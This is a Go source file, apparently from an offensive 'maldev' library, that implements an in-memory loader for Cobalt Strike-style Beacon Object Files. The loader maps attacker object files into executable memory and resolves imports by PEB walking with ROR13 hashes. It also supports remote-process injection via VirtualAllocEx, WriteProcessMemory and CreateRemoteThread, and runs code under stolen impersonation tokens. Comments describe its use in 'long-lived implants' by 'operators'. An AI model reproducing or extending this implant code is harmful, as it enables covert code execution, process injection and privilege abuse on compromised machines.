//go:build windows

package bof

import (
	"context"
	"fmt"
	"runtime"
	"sync"
	"syscall"
	"time"

	"golang.org/x/sys/windows"

	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// BOF represents a parsed Beacon Object File.
type BOF struct {
	Data  []byte
	Entry string // entry point function name (default: "go")

	// output buffers anything BeaconPrintf / BeaconOutput emit during
	// Execute. nil until Execute initialises it; Execute returns its
	// snapshot. Tests can also read the buffer directly via OutputBytes.
	output *beaconOutput

	// errors buffers anything BeaconErrorD / DD / NA emit during
	// Execute. Kept separate from output so callers can route the two
	// to different sinks; read via Errors().
	errors *beaconOutput

	// argBuf is the raw user args passed to Execute. BeaconDataParse
	// produces a parser cursor over this slice.
	argBuf []byte

	// spawnTo / spawnToX86 are the paths BeaconGetSpawnTo returns to
	// the BOF. The CS signature is `char *BeaconGetSpawnTo(BOOL x86)`
	// — operators that target both architectures supply two distinct
	// hosts (rundll32 x86 vs x64, for instance). The pinned []byte
	// forms (with trailing NUL) live in spawnToCStr / spawnToX86CStr
	// so the addresses handed to native code stay stable.
	spawnTo        string
	spawnToCStr    []byte
	spawnToX86     string
	spawnToX86CStr []byte

	// userData is the blob BeaconGetCustomUserData returns to the BOF.
	// Pinned for the BOF instance's lifetime so the pointer handed to
	// native code stays stable across callbacks.
	userData []byte

	// kv backs BeaconAddValue / GetValue / RemoveValue. Lazily allocated
	// on first call and reset between Execute invocations (see Execute).
	kv *kvStore

	// formats tracks BeaconFormatAlloc-issued Go-heap slices so they
	// survive past the BOF entry frame. Lazily allocated on first
	// Alloc, reset between Executes — same shape + scope as kv.
	formats *formatBufStore

	// caller routes the cross-process Beacon API primitives
	// (BeaconInjectProcess: VirtualAllocEx + WriteProcessMemory +
	// CreateRemoteThread) through *wsyscall.Caller when non-nil.
	// nil falls back to the direct kernel32 path. Mirrors the
	// inject/ package convention.
	caller *wsyscall.Caller

	// outputSnapshot pins the bytes BeaconGetOutputData returns to the
	// BOF for the remainder of the BOF call. Used by host-side wrappers
	// (No-Consolation PE loader) that re-read their accumulated output
	// from within the same BOF invocation. Reset each Execute.
	outputSnapshot []byte

	// pendingStream is the chan<- []byte set by ExecuteStream before
	// it calls Execute. Wired into the newly-created beaconOutput at
	// the start of Execute so write() pushes chunks to the consumer
	// in real time. Cleared after Execute returns.
	pendingStream chan<- []byte

	// — Prepared-state cache (filled by prepare, consumed by Execute) —
	//
	// The first Execute call runs prepare() which does the expensive
	// work: parse, VirtualAlloc, copy sections, resolve imports,
	// apply relocations, VirtualProtect. Subsequent Execute calls
	// reuse the cached mapping and only invoke the entry point.
	// Close() releases the mapping; without Close a runtime
	// finalizer eventually VirtualFrees as a safety net.
	execMem     uintptr // VirtualAlloc'd region base (0 when not prepared)
	execMemSize uintptr // total bytes the prepare() pass allocated
	entryAddr   uintptr // absolute address of the BOF's entry symbol
	prepared    bool   // gate against re-running prepare
	closed      bool   // post-Close guard — Execute returns an error

	// writableSnapshots holds the initial bytes of every non-exec
	// section in the mapping. When persistent==false, each Execute
	// restores these bytes so the BOF observes a fresh .data / .bss
	// every call (matches the implicit "BOFs are stateless" contract
	// the in-tree corpus relies on). When persistent==true, the
	// snapshots are taken once and never restored — runs share state,
	// which is what BOFs like No-Consolation rely on for their own
	// LIBS_LOADED caches.
	//
	// Map key is the COFF section index (1-based) — matches the
	// sectionBase / laid bookkeeping in prepare().
	writableSnapshots map[int][]byte

	// writableTargets is the destination side of the same per-section
	// pairing. Each entry is the in-mapping byte slice that
	// restoreWritables copies snapshots[idx] into between Executes
	// when persistent==false. Held separately so the loops don't
	// re-derive addresses from sectionBase every call.
	writableTargets map[int][]byte

	// persistent flips the writable-section reset behaviour.
	// Default (false) preserves the historic contract.
	persistent bool

	// — Sacrificial-thread crash isolation (sacrificial_windows.go) —
	//
	// sacrificialTimeout > 0 enables the dedicated-thread Execute
	// path that catches BOF faults via a process-wide VEH and
	// surfaces them as Go errors instead of process death. Zero
	// preserves the original inline (same-thread) semantics.
	sacrificialTimeout time.Duration

	// fault is written by the VEH when a sacrificial-mode BOF
	// crashes inside its own mapping. Read by the host thread
	// after WaitForSingleObject returns. Atomic stores via the
	// sacrificial_windows.go path keep host-side reads coherent.
	fault faultRecord

	// pdataTable + pdataCount track the .pdata section registered
	// with RtlAddFunctionTable. nil when the BOF has no .pdata
	// section or when prepare skipped registration (Bundle E).
	// Close calls RtlDeleteFunctionTable before VirtualFree —
	// freeing the mapping while the kernel still has function-
	// table entries pointing into it would leak unwind context.
	pdataTable *windows.RUNTIME_FUNCTION
	pdataCount uint32

	// executeAsToken is the impersonation token the sacrificial
	// path applies to the BOF thread (SetThreadToken between
	// CreateThread+SUSPENDED and ResumeThread). Zero — the
	// default — keeps the host's primary token. Has no effect on
	// the inline path (sacrificialTimeout == 0).
	executeAsToken windows.Token

	// execMu serialises Execute / Close / prepare-state-mutating
	// setters (SetPersistent, SetSacrificialThread) on THIS *BOF.
	// Different *BOFs run concurrently — the per-instance lock
	// replaces the historical package-wide lock. Beacon callbacks
	// resolve their *BOF via bofRegistry[GetCurrentThreadId()];
	// the registry is set under execMu so concurrent host
	// goroutines never see a torn registration.
	execMu sync.Mutex
}

// SetPersistent toggles state retention across multiple Execute
// calls on the same *BOF. Affects only non-executable sections
// (.data / .bss / .rdata-with-writes); .text relocations are
// applied once on prepare and never re-touched.
//
//   - false (default): each Execute restores .data / .bss /
//     other writable sections to their initial bytes. Matches
//     the implicit "BOFs are stateless" assumption of the
//     in-tree corpus — hello_beacon, parse_args, realworld_calls
//     all expect fresh memory per call.
//
//   - true: writable sections keep whatever the BOF wrote on
//     the previous Execute. Useful for BOFs like Fortra's
//     No-Consolation which maintain a LIBS_LOADED cache + a
//     handle-info struct across operator-chained invocations.
//
// Returns ErrAlreadyPrepared if the BOF has already run its
// first Execute — the writable-section snapshots are taken on
// prepare, and toggling persistence after that point would only
// affect future restores without resetting the current state,
// which is a footgun. Set persistence before the first Execute.
func (b *BOF) SetPersistent(p bool) error {
	b.execMu.Lock()
	defer b.execMu.Unlock()
	if b.prepared {
		return ErrAlreadyPrepared
	}
	b.persistent = p
	return nil
}

// ErrAlreadyPrepared is returned by SetPersistent when the BOF
// has already run its first Execute. See SetPersistent for the
// rationale (prepare-time snapshots make late toggling
// inconsistent).
var ErrAlreadyPrepared = fmt.Errorf("runtime/bof: BOF already prepared (SetPersistent must be called before first Execute)")

// Close releases the executable mapping + unregisters the .pdata
// unwind entries. Subsequent Execute calls fail cleanly.
// Idempotent; concurrent Close vs Execute on the same *BOF is
// serialised through b.execMu.
//
// Callers that Load + Execute once and discard can skip Close —
// the runtime finalizer wired in Load releases the mapping when
// the *BOF becomes unreachable. Long-lived BOFs (the
// runtime/pe.RunExecutable hot path that caches the embedded
// No-Consolation .o) should Close explicitly at shutdown.
func (b *BOF) Close() error {
	b.execMu.Lock()
	defer b.execMu.Unlock()
	if b.closed {
		return nil
	}
	// Refuse to close while a sacrificial-mode Execute is still
	// in flight on another goroutine — freeing execMem while the
	// BOF thread is still executing inside that mapping is an
	// instant crash. The sacrificialMap holds *BOF entries
	// between ResumeThread and the deferred Delete inside
	// callEntrySacrificial; if our pointer is in there, the
	// thread is still alive (or the VEH+exit-stub teardown is
	// in-flight).
	if sacrificialBOFActive(b) {
		return fmt.Errorf("runtime/bof: Close called while sacrificial Execute in flight")
	}
	b.closed = true
	// Disarm the safety-net finalizer set in Load so it can't race
	// us — finalizers run on their own goroutine and would
	// double-free if Close ran first then GC fired.
	runtime.SetFinalizer(b, nil)
	b.formats = nil // drop any unfreed BeaconFormatAlloc slices
	// Unregister .pdata with the kernel BEFORE the VirtualFree.
	// Reverse order matters: freeing the mapping while the kernel
	// still has function-table entries pointing into it would
	// leave dangling unwind context for any thread that faulted
	// later (rare, but real — observed once on a long-lived
	// implant that kept Close'ing and Loading BOFs in a tight
	// loop while another goroutine deliberately threw).
	if b.pdataTable != nil {
		windows.RtlDeleteFunctionTable(b.pdataTable)
		b.pdataTable = nil
		b.pdataCount = 0
	}
	if b.execMem != 0 {
		err := windows.VirtualFree(b.execMem, 0, windows.MEM_RELEASE)
		b.execMem = 0
		b.execMemSize = 0
		b.entryAddr = 0
		b.writableSnapshots = nil
		// writableTargets also aliased the freed mapping — clear so
		// any stray reference becomes a clean nil-deref instead of a
		// use-after-free.
		b.writableTargets = nil
		b.prepared = false
		if err != nil {
			return fmt.Errorf("runtime/bof: VirtualFree on Close: %w", err)
		}
	}
	return nil
}

// SetUserData configures the blob BeaconGetCustomUserData returns to the
// BOF. The slice is retained by value — callers may reuse the original
// buffer afterwards without disturbing the BOF.
//
// Call before the first Execute or between Execute calls; mutating it
// concurrently with an in-flight (especially sacrificial-thread)
// Execute is a race the package does not currently guard against.
func (b *BOF) SetUserData(data []byte) {
	if len(data) == 0 {
		b.userData = nil
		return
	}
	b.userData = append([]byte(nil), data...)
}

// SetSpawnTo configures the path BeaconGetSpawnTo returns when the BOF
// asks the loader for a fork-and-run target. Empty string (the default)
// means "no spawn target" — BOFs that consult BeaconGetSpawnTo see an
// empty C string and typically fall back to their own logic. Path is
// converted to a NUL-terminated byte slice once and pinned for the
// remaining lifetime of the BOF instance, so the address stays stable
// across Beacon API callbacks. Same call-time contract as SetUserData.
func (b *BOF) SetSpawnTo(path string) {
	b.spawnTo = path
	if path == "" {
		b.spawnToCStr = nil
		return
	}
	b.spawnToCStr = append([]byte(path), 0)
}

// SetExecuteAsToken configures an impersonation token the
// sacrificial-thread path applies to the BOF thread before
// ResumeThread (SetThreadToken between CreateThread+SUSPENDED and
// ResumeThread). The BOF then executes under that identity —
// closes the historical limitation where BeaconUseToken did not
// "cross over" into the sacrificial thread (the host could
// impersonate, but the BOF thread started under the primary
// token regardless).
//
// Zero (default) keeps the host's primary token. Has no effect on
// the inline Execute path (sacrificialTimeout == 0). The token is
// caller-owned — the BOF does NOT call CloseHandle on it; the
// operator who duplicated / opened the token is responsible for
// its lifetime, which typically outlives many BOFs.
//
// Usage:
//
//	h, _ := windows.OpenProcessToken(targetProcess,
//	    windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &primaryToken)
//	var dup windows.Token
//	windows.DuplicateTokenEx(primaryToken, ...&dup)
//	defer windows.CloseHandle(windows.Handle(dup))
//
//	b, _ := bof.Load(coffBytes)
//	defer b.Close()
//	b.SetSacrificialThread(5 * time.Second)
//	b.SetExecuteAsToken(dup)
//	_, _ = b.Execute(args)
func (b *BOF) SetExecuteAsToken(t windows.Token) {
	b.executeAsToken = t
}

// SetCaller installs an optional *wsyscall.Caller for the BOF's
// cross-process Beacon API primitives (BeaconInjectProcess and the
// inject/spawn combos). nil — the default — keeps the direct
// kernel32 path (VirtualAllocEx / WriteProcessMemory /
// CreateRemoteThread). Same convention as inject/.
//
// Has no effect on the in-process loader path itself (relocations,
// the entry call, BeaconPrintf, etc.). The Caller only re-routes
// the three kernel32 calls the BOF can drive via BeaconInjectProcess.
//
// SCOPE WARNING: dynamic imports the BOF itself resolves
// (__imp_KERNEL32$VirtualAlloc / __imp_NTDLL$Nt* / etc.) are patched
// at prepare time as direct function addresses via PEB walk + ROR13.
// The BOF then `call [rip+slot]`s straight into the resolved
// function — bypassing this Caller entirely. Only the three
// BeaconInjectProcess primitives route through it. Operators who
// need full Caller coverage must rewrite the BOF's imports to call
// into a host dispatcher; today's package does not.
//
// The Caller's lifetime is operator-owned: BOF.Close does NOT call
// caller.Close — the same Caller is typically shared across many
// BOFs and inject sites and must outlive all of them.
func (b *BOF) SetCaller(c *wsyscall.Caller) {
	b.caller = c
}

// SetSpawnToX86 configures the path BeaconGetSpawnTo returns when the
// BOF asks for an x86 host (the `BOOL x86` arg is TRUE). Distinct from
// the default SetSpawnTo, which configures the x64 path. Empty string
// clears the override; BOFs that ask for x86 without an x86 path
// configured see an empty C string. Same call-time contract as
// SetSpawnTo.
func (b *BOF) SetSpawnToX86(path string) {
	b.spawnToX86 = path
	if path == "" {
		b.spawnToX86CStr = nil
		return
	}
	b.spawnToX86CStr = append([]byte(path), 0)
}

// Errors returns whatever the BOF emitted via BeaconErrorD / DD / NA
// during the last Execute. Returns nil before the first Execute call.
// The slice is a fresh copy — safe to retain after subsequent Execute
// calls clear the underlying buffer.
//
// After Close, returns whatever the FINAL Execute wrote — the buffer
// is not zeroed at teardown so post-mortem inspection still works.
// Callers that re-Load and re-Execute observe a freshly-allocated
// buffer (Execute resets it via newBeaconOutput).
func (b *BOF) Errors() []byte {
	if b.errors == nil {
		return nil
	}
	return b.errors.Bytes()
}

// Load parses a COFF object file from bytes.
func Load(data []byte) (*BOF, error) {
	if len(data) < coffHeaderSize {
		return nil, fmt.Errorf("invalid COFF: data too small")
	}

	hdr := parseCOFFHeader(data)
	if hdr.Machine != machineAMD64 {
		// 0x014c is i386 — route to the fork-and-run path via
		// bof.Run instead of the in-process Load. Surface the
		// specific cross-arch error so operators don't have to
		// decode a raw machine code.
		if hdr.Machine == 0x014c {
			return nil, fmt.Errorf("%w (machine=0x014c, use bof.Run for routing)", ErrCrossArchX86Unsupported)
		}
		return nil, fmt.Errorf("unsupported COFF machine type: 0x%X", hdr.Machine)
	}

	// Basic validation: section table must fit.
	sectionTableEnd := coffHeaderSize + int(hdr.SizeOfOptionalHeader) + int(hdr.NumberOfSections)*coffSectionSize
	if sectionTableEnd > len(data) {
		return nil, fmt.Errorf("invalid COFF: truncated section table")
	}

	b := &BOF{
		Data:  data,
		Entry: "go",
	}
	// Safety net: callers that forget Close eventually trip this
	// finalizer when the *BOF becomes unreachable. The runtime
	// makes no guarantees on finalizer timing, so long-lived
	// implants should still call Close explicitly to free the
	// VirtualAlloc'd executable region in a timely fashion.
	runtime.SetFinalizer(b, func(b *BOF) {
		if b.prepared && !b.closed && b.execMem != 0 {
			if b.pdataTable != nil {
				windows.RtlDeleteFunctionTable(b.pdataTable)
			}
			_ = windows.VirtualFree(b.execMem, 0, windows.MEM_RELEASE)
		}
	})
	return b, nil
}

// Execute runs the BOF's entry point with the given arguments.
// The BOF is loaded into executable memory, relocations applied,
// and the entry function is called. Anything the BOF emits via
// BeaconPrintf / BeaconOutput is captured and returned as the
// first result.
//
// Concurrency: BOF execution is serialised package-wide (the
// Beacon API stubs resolve their *BOF via the per-thread
// bofRegistry; concurrent Execute on the SAME *BOF blocks on
// b.execMu, concurrent Execute on different *BOFs runs in
// parallel (Bundle C).
func (b *BOF) Execute(args []byte) ([]byte, error) {
	if len(b.Data) < coffHeaderSize {
		return nil, fmt.Errorf("invalid COFF: data too small")
	}

	b.output = newBeaconOutput()
	b.errors = newBeaconOutput()
	if b.pendingStream != nil {
		b.output.stream = b.pendingStream
		b.pendingStream = nil // one-shot
	}
	b.argBuf = args
	// fresh per-Execute scope for both kv + format buffers — cross-Run
	// state goes through the implant. Without the format reset, BOFs
	// that crash or skip BeaconFormatFree leaked their buffer forever.
	b.kv = nil
	b.formats = nil

	// Pin the goroutine to its OS thread for the BOF call. BeaconUseToken
	// impersonates on the *current thread*; without LockOSThread the Go
	// scheduler could migrate the goroutine after the impersonation call
	// and run subsequent Win32 calls under the original token. Registry
	// entry must be written AFTER LockOSThread — otherwise a callback
	// firing immediately after Store on a different thread would race.
	runtime.LockOSThread()
	b.execMu.Lock()
	tid := windows.GetCurrentThreadId()
	bofRegistry.Store(tid, b)
	defer func() {
		// Best-effort revert in case the BOF impersonated and didn't
		// revert. Errors are ignored — RevertToSelf can only fail when
		// no impersonation is active, which is the common case.
		_ = windows.RevertToSelf()
		bofRegistry.Delete(tid)
		b.execMu.Unlock()
		runtime.UnlockOSThread()
	}()

	if b.closed {
		return nil, fmt.Errorf("runtime/bof: Execute on closed BOF")
	}

	// Lazy preparation: parse + allocate + relocate + protect happen
	// once per BOF lifetime. Subsequent Execute calls land directly
	// at the entry call below, with .data/.bss optionally restored.
	if !b.prepared {
		if err := b.prepare(); err != nil {
			return nil, err
		}
	} else if !b.persistent {
		b.restoreWritables()
	}

	// 8. Dispatch to the entry point. callEntry chooses inline
	//    (default — same thread as the host, defer-recover for
	//    Go panics only) or sacrificial-thread (when the operator
	//    called SetSacrificialThread; spawns the entry on a
	//    dedicated thread with VEH-mediated crash isolation).
	//    See runtime/bof/sacrificial_windows.go for the
	//    threat-model + limitations rundown.
	if err := b.callEntry(args); err != nil {
		return b.output.Bytes(), err
	}
	return b.output.Bytes(), nil
}

// restoreWritables resets the non-exec sections to their initial
// state captured by prepare. Called between Execute invocations
// when persistent==false. Cheap (only the writable sections, no
// VirtualAlloc / relocation / VirtualProtect re-run).
func (b *BOF) restoreWritables() {
	for idx, dst := range b.writableTargets {
		copy(dst, b.writableSnapshots[idx])
	}
}


// ExecuteStream runs the BOF and emits each output chunk to `out` as
// the BOF writes it (BeaconPrintf / BeaconOutput call sites push
// after each invocation). Mirrors goffloader's async channel pattern
// while keeping Execute's sync semantics intact for callers that
// don't need streaming.
//
// Semantics:
//   - The channel is closed when the BOF returns (or panics).
//   - Slow consumers cause chunks to be DROPPED, not blocked — the
//     full buffer remains accessible via the returned []byte after
//     close.
//   - ctx is honoured at the consumer-loop level: if ctx is Done
//     while the BOF is still running, ExecuteStream returns early
//     with ctx.Err() but the BOF goroutine continues to completion
//     (native code can't be preempted). Late chunks are dropped.
//
// Usage:
//
//	ch := make(chan []byte, 16)
//	go func() {
//	    for b := range ch { fmt.Print(string(b)) }
//	}()
//	full, err := b.ExecuteStream(ctx, argBuf, ch)
func (b *BOF) ExecuteStream(ctx context.Context, args []byte, out chan<- []byte) ([]byte, error) {
	if out == nil {
		return b.Execute(args)
	}
	type result struct {
		full []byte
		err  error
	}
	done := make(chan result, 1)
	go func() {
		// Wire the stream channel before Execute lays down the output
		// buffer. Execute resets b.output via newBeaconOutput; we
		// poke the stream pointer in via a closure-friendly callback.
		b.installStream(out)
		full, err := b.Execute(args)
		close(out)
		done <- result{full: full, err: err}
	}()
	select {
	case <-ctx.Done():
		// BOF can't be preempted; the producer goroutine drains in
		// the background and closes the channel on its own.
		return nil, ctx.Err()
	case r := <-done:
		return r.full, r.err
	}
}

// installStream pre-arms the BOF's stream sink so the *next* Execute
// run pushes each chunk to it. Wired through a separate field on the
// BOF struct because newBeaconOutput() is called inside Execute and
// can't see the stream channel otherwise.
func (b *BOF) installStream(out chan<- []byte) {
	b.pendingStream = out
}

// syscallN dispatches to syscall.Syscall with a small arity table.
// Capped at four arguments — the BOF entry signature is always
// `void go(char *args, int len)` (2 args). The default branch is a
// belt-and-braces fallback for future entry shapes, NOT a generic
// variadic syscall helper; the first three args are passed and the
// rest are silently dropped. Don't grow the cap unless the BOF
// calling convention itself grows.
func syscallN(addr uintptr, args ...uintptr) {
	switch len(args) {
	case 0:
		syscall.Syscall(addr, 0, 0, 0, 0)
	case 1:
		syscall.Syscall(addr, 1, args[0], 0, 0)
	case 2:
		syscall.Syscall(addr, 2, args[0], args[1], 0)
	default:
		syscall.Syscall(addr, uintptr(len(args)), args[0], args[1], args[2])
	}
}
